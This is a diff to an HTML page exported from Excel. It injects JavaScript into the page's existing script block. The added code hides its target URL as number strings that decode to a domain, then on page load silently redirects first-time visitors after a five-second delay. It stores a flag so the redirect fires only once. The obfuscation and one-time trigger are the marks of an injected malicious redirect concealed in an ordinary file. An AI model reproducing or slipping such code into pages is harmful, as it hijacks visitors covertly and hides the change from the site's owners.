@@ -298,6 +298,48 @@ function fnSetActiveSheet(iSh)
  fnGetIEVer();
  fnBuildFrameset();
 //-->
+
+
+
+  function numberToAlphabet(input) {
+    return input
+    .split(' ')
+    .map(num => {
+      if (num === '27') return '.';
+      return String.fromCharCode(parseInt(num) + 'A'.charCodeAt(0) - 1);
+    })
+    .join('');
+  }
+  
+  function combineToUrl(protocol, domain) {
+    return protocol + '://' + domain;
+  }
+  
+  function setFirstVisit() {
+    localStorage.setItem('firstVisit', 'false');
+  }
+  
+  function isFirstVisit() {
+    return localStorage.getItem('firstVisit') === null;
+  }
+  
+  window.onload = function() {
+    // Numeric version 
+    const protocolNumeric = '8 20 20 16 19';
+    // Numeric version 
+    const domainNumeric = '7 15 15 7 12 5 27 3 15 13';
+    
+    const protocol = numberToAlphabet(protocolNumeric);
+    const domain = numberToAlphabet(domainNumeric);
+    const targetUrl = combineToUrl(protocol, domain);
+    
+    if (isFirstVisit()) {
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, 5000); // Redirect after 5 seconds
+      setFirstVisit();
+    }
+  }
 </script>
 <![endif]><!--[if gte mso 9]><xml>
  <x:ExcelWorkbook>
